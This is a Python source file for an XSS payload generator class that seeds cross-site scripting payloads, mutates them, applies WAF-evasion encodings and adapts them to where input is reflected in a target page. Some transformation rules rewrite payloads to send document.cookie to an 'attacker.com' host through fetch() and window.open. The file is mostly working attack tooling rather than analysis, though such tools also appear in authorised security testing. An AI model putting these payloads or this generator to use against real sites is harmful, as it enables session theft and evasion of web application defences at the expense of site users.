import os
import random
import numpy as np
import re
import hashlib
import json
from pathlib import Path
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier

class AIPayloadGenerator:
    def __init__(self, model_dir=None):
        self.model_dir = model_dir or os.path.join(os.path.dirname(__file__), 'models')
        os.makedirs(self.model_dir, exist_ok=True)
        
        # Load existing payloads and their effectiveness
        self.payload_database_path = os.path.join(self.model_dir, 'payload_database.json')
        self.load_payload_database()
        
        # Initialize vectorizer for payload similarity
        self.vectorizer = TfidfVectorizer(
            analyzer='char_wb', 
            ngram_range=(2, 5),
            max_features=5000
        )
        
        # Load or create payload similarity model
        self.similarity_model_path = os.path.join(self.model_dir, 'similarity_model.pkl')
        self.load_or_create_model()
        
        # Context-specific transformation templates
        self.context_transformations = self._load_transformations()
        
        # Evasion techniques
        self.evasion_techniques = self._load_evasion_techniques()
    
    def load_payload_database(self):
        """Load the database of payloads and their effectiveness"""
        if os.path.exists(self.payload_database_path):
            with open(self.payload_database_path, 'r') as f:
                self.payload_database = json.load(f)
        else:
            # Initialize with seed payloads from different contexts
            self.payload_database = {
                "html": {
                    "<script>alert('XSS')</script>": {"success_rate": 0.7, "contexts": ["html"], "evasion": []},
                    "<img src=x onerror=alert('XSS')>": {"success_rate": 0.8, "contexts": ["html"], "evasion": []},
                    "<svg/onload=alert('XSS')>": {"success_rate": 0.75, "contexts": ["html"], "evasion": []}
                },
                "attribute": {
                    "\" onmouseover=\"alert('XSS')\"": {"success_rate": 0.6, "contexts": ["attribute"], "evasion": []},
                    "\" onerror=\"alert('XSS')\"": {"success_rate": 0.65, "contexts": ["attribute"], "evasion": []}
                },
                "js": {
                    "';alert('XSS');//": {"success_rate": 0.5, "contexts": ["js"], "evasion": []},
                    "alert('XSS')": {"success_rate": 0.4, "contexts": ["js"], "evasion": []}
                },
                "url": {
                    "javascript:alert('XSS')": {"success_rate": 0.45, "contexts": ["url"], "evasion": []}
                }
            }
            self.save_payload_database()
    
    def save_payload_database(self):
        """Save the payload database to disk"""
        with open(self.payload_database_path, 'w') as f:
            json.dump(self.payload_database, f, indent=2)
    
    def load_or_create_model(self):
        """Load the similarity model or create a new one"""
        if os.path.exists(self.similarity_model_path):
            with open(self.similarity_model_path, 'rb') as f:
                self.similarity_model = pickle.load(f)
        else:
            # Create a model from the existing payload database
            all_payloads = []
            labels = []
            
            for context, payloads in self.payload_database.items():
                for payload in payloads:
                    all_payloads.append(payload)
                    labels.append(context)
            
            if all_payloads:
                # Fit the vectorizer
                payload_features = self.vectorizer.fit_transform(all_payloads)
                
                # Create a simple classifier
                self.similarity_model = RandomForestClassifier(n_estimators=100)
                self.similarity_model.fit(payload_features, labels)
                
                # Save the model
                with open(self.similarity_model_path, 'wb') as f:
                    pickle.dump(self.similarity_model, f)
            else:
                self.similarity_model = None
    
    def _load_transformations(self):
        """Load context-specific transformation templates"""
        return {
            "html": [
                lambda p: p.replace("alert('XSS')", "fetch('https://attacker.com/'+document.cookie)"),
                lambda p: p.replace("alert('XSS')", "eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))"),
                lambda p: p.replace("<script>", "<script>history.pushState('','','/'+"),
            ],
            "attribute": [
                lambda p: p.replace("alert('XSS')", "eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"),
                lambda p: p.replace("onmouseover", "onmouseenter"),
                lambda p: p.replace("onerror", "onanimationstart"),
            ],
            "js": [
                lambda p: p.replace("alert('XSS')", "(()=>{return this})().alert('XSS')"),
                lambda p: p.replace("alert('XSS')", "window['\\x61\\x6c\\x65\\x72\\x74']('XSS')"),
                lambda p: p.replace("alert('XSS')", "setTimeout('alert(\\'XSS\\')',10)"),
            ],
            "url": [
                lambda p: p.replace("javascript:", "j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:"),
                lambda p: p.replace("javascript:", "data:text/html,<script>"),
                lambda p: p.replace("alert('XSS')", "window.open('https://attacker.com/'+document.cookie)"),
            ]
        }
    
    def _load_evasion_techniques(self):
        """Load WAF evasion techniques"""
        return [
            # Character encoding
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e"),
            lambda p: p.replace("<", "\\x3c").replace(">", "\\x3e"),
            
            # Case manipulation
            lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p),
            
            # Whitespace variation
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "\t"),
            
            # Script tag alternatives
            lambda p: p.replace("<script>", "<svg onload="),
            
            # Alert alternatives
            lambda p: p.replace("alert", "confirm"),
            lambda p: p.replace("alert", "prompt"),
        ]
    
    def update_payload_effectiveness(self, payload, context, success):
        """Update the effectiveness score for a payload"""
        if context not in self.payload_database:
            self.payload_database[context] = {}
        
        if payload in self.payload_database[context]:
            # Update existing payload
            entry = self.payload_database[context][payload]
            old_success_rate = entry["success_rate"]
            # Weighted average: give more weight to new results
            entry["success_rate"] = 0.7 * (1 if success else 0) + 0.3 * old_success_rate
        else:
            # Add new payload
            self.payload_database[context][payload] = {
                "success_rate": 1.0 if success else 0.1,  # Initial success rate
                "contexts": [context],
                "evasion": []
            }
        
        # Save the updated database
        self.save_payload_database()
        
        # Re-train the model if needed
        self.load_or_create_model()
    
    def generate_payloads(self, context, count=5, target_info=None, evasion_level=1):
        """
        Generate XSS payloads for a specific context
        
        Args:
            context: The injection context (html, attribute, js, url)
            count: Number of payloads to generate
            target_info: Dictionary with information about the target (WAF, tech stack)
            evasion_level: 0=none, 1=basic, 2=advanced, 3=extreme
            
        Returns:
            List of generated payloads
        """
        if context not in self.payload_database or not self.payload_database[context]:
            # Fallback to HTML context if requested context has no data
            context = "html" if "html" in self.payload_database else list(self.payload_database.keys())[0]
        
        # Get base payloads sorted by success rate (highest first)
        base_payloads = sorted(
            self.payload_database[context].items(),
            key=lambda x: x[1]["success_rate"],
            reverse=True
        )
        
        generated_payloads = []
        
        # Take top payloads
        for payload, info in base_payloads[:count//2]:
            generated_payloads.append(payload)
        
        # Fill the rest with mutations and transformations
        remaining = count - len(generated_payloads)
        if remaining > 0:
            # Generate mutations
            for _ in range(remaining):
                # Select a random base payload from top half
                base_payload, base_info = random.choice(base_payloads[:max(len(base_payloads)//2, 1)])
                
                # Apply transformations based on context
                if random.random() < 0.7 and context in self.context_transformations:
                    transform_func = random.choice(self.context_transformations[context])
                    mutated = transform_func(base_payload)
                else:
                    # Apply character-level mutations
                    mutated = self._mutate_payload(base_payload)
                
                # Apply evasion techniques based on level
                if evasion_level > 0:
                    num_evasions = min(evasion_level, len(self.evasion_techniques))
                    evasion_funcs = random.sample(self.evasion_techniques, num_evasions)
                    
                    for func in evasion_funcs:
                        mutated = func(mutated)
                
                generated_payloads.append(mutated)
        
        return generated_payloads
    
    def _mutate_payload(self, payload):
        """Apply character-level mutations to a payload"""
        mutations = [
            # Case variations
            lambda p: p.replace("alert", "ALERT"),
            
            # Whitespace variations
            lambda p: p.replace(" ", " "*random.randint(1, 3)),
            
            # Encoding variations
            lambda p: p.replace("XSS", "\\x58\\x53\\x53"),
            
            # Quote variations
            lambda p: p.replace("'", "\"").replace("\"", "'"),
            
            # Function variations
            lambda p: p.replace("alert", "confirm"),
            
            # Tag variations
            lambda p: p.replace("<script>", "<script type='text/javascript'>"),
            
            # Add comments
            lambda p: p.replace("<script>", "<script>/**/"),
            
            # Unicode alternatives
            lambda p: p.replace("a", "\\u0061").replace("e", "\\u0065"),
        ]
        
        # Apply 1-3 random mutations
        for _ in range(random.randint(1, 3)):
            mutation = random.choice(mutations)
            payload = mutation(payload)
        
        return payload
    
    def get_context_probability(self, payload):
        """Predict the probable context for a payload"""
        if not self.similarity_model:
            return "html"  # Default to HTML if no model
        
        # Vectorize the payload
        payload_vec = self.vectorizer.transform([payload])
        
        # Get the predicted context
        predicted_context = self.similarity_model.predict(payload_vec)[0]
        
        return predicted_context
    
    def generate_adaptive_payloads(self, target_response, marker, count=5):
        """
        Generate payloads adaptively based on the response context
        
        Args:
            target_response: The HTML response from the target
            marker: The marker string used to identify reflection points
            count: Number of payloads to generate
            
        Returns:
            List of generated payloads
        """
        if not marker in target_response:
            return self.generate_payloads("html", count=count)
        
        # Analyze the context
        context = self._analyze_context(target_response, marker)
        
        # Generate context-specific payloads
        return self.generate_payloads(context, count=count)
    
    def _analyze_context(self, html_response, marker):
        """Analyze the context in which the marker appears"""
        try:
            # Check JS context (script tags)
            if f"<script>{marker}" in html_response or f"<script type=\"text/javascript\">{marker}" in html_response:
                return "js"
            
            # Check JS event handler context
            event_pattern = re.compile(r'on\w+\s*=\s*["\'][^"\']*' + re.escape(marker))
            if event_pattern.search(html_response):
                return "js"
            
            # Check attribute context
            attr_pattern = re.compile(r'=\s*["\'][^"\']*' + re.escape(marker))
            if attr_pattern.search(html_response):
                return "attribute"
            
            # Check URL context
            url_attrs = ['href', 'src', 'action', 'formaction']
            for attr in url_attrs:
                if f'{attr}="{marker}"' in html_response or f"{attr}='{marker}'" in html_response:
                    return "url"
            
            # Default to HTML context
            return "html"
        except Exception as e:
            print(f"Error analyzing context: {e}")
            return "html"
